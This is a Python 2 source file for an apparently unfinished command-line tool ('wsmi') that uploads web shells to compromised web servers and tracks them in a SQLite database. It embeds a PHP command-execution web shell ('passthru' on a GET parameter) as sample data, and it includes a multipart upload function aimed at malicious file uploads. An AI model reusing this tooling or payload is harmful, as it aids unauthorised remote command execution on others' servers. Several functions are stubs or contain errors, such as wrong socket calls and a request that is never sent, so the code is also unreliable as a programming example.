import sqlite3
import signal
import sys
import urllib2
import threading
import socket
import shells


###next section is for threading combined with sockets
class threading_network_listener(threading.Thread):
	"""
		This class represents the ability for the program to thread off and
		set up a listener and makes an http request to trigger the candidate web shell
		sitting on the compromised web server.
	"""

	def __init__(self, port = None):
		self.port = None#the intended port for the thread to listen on
		self.listen_sock = None#the actual socket listening on the port

	def create_socket():
		""" Creates a socket for the thread to listen on """
		listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
		listen_socket.bind("", self.port)#listens on any interface's ip address
		listen_socket.listen()#actually listen to a port
		print "socket bound to port "+self.port
		return listen_socket
	
	def run(self):
		self.socket = create_socket()


database_name = ""
prompt = "wsmi>"
directory = ""
def print_banner():
	print "        _       __          __      _    __     __  __"
	print "       / \\      \\ \\        / /     |  | |     ||  "
	print "      /   \\      \\ \\      / /      |"
	print "     /_____\\      \\ \\    / /       |"

def upload_shell():
	"""
		Handles the interaction to the user to handle all the details
		of file uploading to the server.
	"""
	url = raw_input("url:")
	page = raw_input("page:")
	method = raw_input("http method:")
	file_name = raw_input("filename:")

def help():
	print "Interactive help menu type  help <module> to get more information on a module\n"
	print "upload-shell\t\t Upload a shell to target webserver"
	print "new-database\t\t Start a new database to keep track of webshells"
	print "view-shells\t\t View information about the currently running shells"

def router(command):
	"""
		Handles routing of functions that a simple dictionary will not accomplish
		Takes the last part of the command that the user entered and interprets it.
	"""
	global prompt
	global directory
	if command[0:6] == "shells":
		if len(command) == 6:
			prompt = "wsmi (shells)>"
			directory = "shells"
		elif command[6:] == "/php":
			prompt = "wsmi (shells/php)>"
			directory = "shells/php"

def get_input():
	""" gets the user's input and routes it accordingly"""
	global prompt
	userinput = raw_input(prompt)
	if userinput[:3] == "use":
		router(userinput[4:])
	else:
		try:
			functions[userinput]()
		except KeyError:
			print "caught error"

def traverse_up():
	"""
		Responsible for moving up the directory structure
	"""
	global directory

def initialize_database():
	"""
		Responsible for initializing a new database for storing user
		interactions with their webshells.Will prompt the user for a 
		database name and a new sqlite3	database will be created. The 
		only thing that will be committed is the changes to the schema
	"""
	
	name = raw_input("database name:")#prompting the user for a database name
	conn = sqlite3.connect(name)#creating the database
	global database_name
	database_name = name
	cursor = conn.cursor()

	#sample data for the time being
	cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text, language text)")
	cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
		[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
	conn.commit()

def show_shells():
	"""
		Shows the currently uploaded shells at specified urls
	"""
	try:
		conn = sqlite3.connect(database_name)
		cursor = conn.cursor()
		query = "select attackurl from vulnerable_sites"
		cursor.execute(query)
		rows = cursor.fetchall()
		print "number\t\tattackurl"
		print "------\t\t---------"
		i=0
		for row in rows:
			print str(i)+'\t\t',row[0]
			i+=1
	except sqlite3.OperationalError:
		print "Need to have a database before you can view shells"

def exit():
	sys.exit(1)

def run_candidate_threads():
	"""

	"""
	

def check_candidacy():
	"""
		script that starts the process of checking a candidacy for a specific 
		web server.

		
	"""
	num_threads = raw_input("number of threads:")
	timing = raw_input("timing level(0-5):")


	

def show_contents():
	global directory
	
	print "showing contents"

#a dictionary of functions that we can call based off of a user's input
functions = {
	"help":help,
	"upload-shell":upload_shell,
	"new-database":initialize_database,
	"view-shells":show_shells,
	"exit":exit,
	"quit":exit,
	"back":traverse_up,
	"show":show_contents,
	"check-candidacy":check_candidacy
}

def keyboardHandler(signal, frame):
		"""Handles keyboard interrupts and exits gracefully"""
		print ""
		sys.exit(0)
		#TODO: eventually write out to the database

def main():
	#handles keyboard interrupts gracefully
	signal.signal(signal.SIGINT, keyboardHandler)
	a = threading_network_listener()

	while 1:
		get_input()

def http_file_upload(url,filename):	
	"""
		Responsible for the actual uploading of a file.  Will handle the entirety of 
		uploading the file via http methods. 

		@param url the url of the malicious file upload
		@param filename the name of the file to upload at the moment must be inside the current directory
	"""
	file = open(filename,'r')
	file_contents = file.read()
	file.close()
	boundary = '-----------------WhenIwalkIntheClub'
	headers = {'User-Agent':'Mozilla 5.0',
				'Content-Type':'multipart/form-data; boundary='+boundary,}
	data = boundary + '\r\n' + "Content-Disposition: form-data; name=\"MAX FILE SIZE\"\r\n\r\n100000\r\n"
	data += boundary + '\r\nContent-Disposition: form-data; name="uploadedfile";name="' + filename + "\"\r\n"
	data += "Content-Type: application/x-object\r\n\r\n"+file_contents+'\r\n'+boundary+'--\r\n'
	request = urllib2.Request(url,data,headers)

main()